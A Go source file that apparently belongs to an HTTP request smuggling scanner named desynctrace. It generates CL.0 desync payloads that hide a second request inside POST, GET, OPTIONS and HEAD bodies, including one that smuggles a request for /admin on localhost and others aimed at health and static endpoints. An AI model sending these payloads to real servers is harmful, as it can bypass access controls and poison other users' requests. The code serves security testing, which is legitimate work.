package vectors

import (
	"fmt"

	"github.com/byteoverride/desynctrace/internal/client"
)

type CL0Vector struct{}

func NewCL0Vector() *CL0Vector {
	return &CL0Vector{}
}

func (v *CL0Vector) Name() string {
	return "CL.0 (Front-end uses CL, Back-end ignores body)"
}

func (v *CL0Vector) Type() VectorType {
	return CL0
}

func (v *CL0Vector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	smuggled := "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
	req1 := &client.Request{
		Method: "POST",
		URL:    baseReq.URL,
		Headers: map[string]string{
			"Connection": "keep-alive",
		},
		ContentLength: int64(len(smuggled)),
		Body:          []byte(smuggled),
	}
	payloads = append(payloads, req1)
	return payloads
}

func (v *CL0Vector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// 1. Basic CL.0 — POST with smuggled GET in body
	{
		smuggled := fmt.Sprintf("GET /desynctrace-cl0-canary HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(smuggled), smuggled)
		payloads = append(payloads, RawPayload{
			Name:        "cl0-basic",
			Data:        []byte(raw),
			Description: "CL.0: backend ignores POST body, body becomes next request",
			Technique:   "cl0-basic",
		})
	}

	// 2. CL.0 via GET with body (novel)
	// Some backends accept GET with body (frontend forwards it), others ignore
	{
		smuggled := fmt.Sprintf("GET /desynctrace-cl0-get HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		raw := fmt.Sprintf("GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(smuggled), smuggled)
		payloads = append(payloads, RawPayload{
			Name:        "cl0-via-get",
			Data:        []byte(raw),
			Description: "CL.0 via GET: some backends ignore body on GET requests but frontend forwards it",
			Technique:   "cl0-get-body",
		})
	}

	// 3. CL.0 via OPTIONS (novel)
	{
		smuggled := fmt.Sprintf("GET /desynctrace-cl0-options HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		raw := fmt.Sprintf("OPTIONS %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(smuggled), smuggled)
		payloads = append(payloads, RawPayload{
			Name:        "cl0-via-options",
			Data:        []byte(raw),
			Description: "CL.0 via OPTIONS: backend may ignore body on OPTIONS requests",
			Technique:   "cl0-options-body",
		})
	}

	// 4. CL.0 via HEAD (novel)
	{
		smuggled := fmt.Sprintf("GET /desynctrace-cl0-head HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		raw := fmt.Sprintf("HEAD %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(smuggled), smuggled)
		payloads = append(payloads, RawPayload{
			Name:        "cl0-via-head",
			Data:        []byte(raw),
			Description: "CL.0 via HEAD: some proxies forward HEAD body, backend ignores it",
			Technique:   "cl0-head-body",
		})
	}

	// 5. CL.0 with Content-Type mismatch
	// Some backends ignore body when Content-Type doesn't match expectations
	{
		smuggled := fmt.Sprintf("GET /desynctrace-cl0-ct HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Content-Type: text/plain\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(smuggled), smuggled)
		payloads = append(payloads, RawPayload{
			Name:        "cl0-content-type-mismatch",
			Data:        []byte(raw),
			Description: "CL.0: backend ignores body when Content-Type is unexpected (e.g., text/plain on an API endpoint)",
			Technique:   "cl0-ct-mismatch",
		})
	}

	// 6. CL.0 targeting specific backend paths (e.g., static files, health checks)
	{
		smuggled := fmt.Sprintf("GET /desynctrace-cl0-static HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		for _, targetPath := range []string{"/", "/favicon.ico", "/robots.txt", "/health", "/status"} {
			raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Content-Length: %d\r\n"+
				"Connection: keep-alive\r\n"+
				"\r\n"+
				"%s", targetPath, host, len(smuggled), smuggled)
			payloads = append(payloads, RawPayload{
				Name:        fmt.Sprintf("cl0-path-%s", targetPath),
				Data:        []byte(raw),
				Description: fmt.Sprintf("CL.0 targeting %s: static/health endpoints often have different body handling", targetPath),
				Technique:   "cl0-path-specific",
			})
		}
	}

	return payloads
}

func (v *CL0Vector) Verify(resp *client.Response) bool {
	return false
}
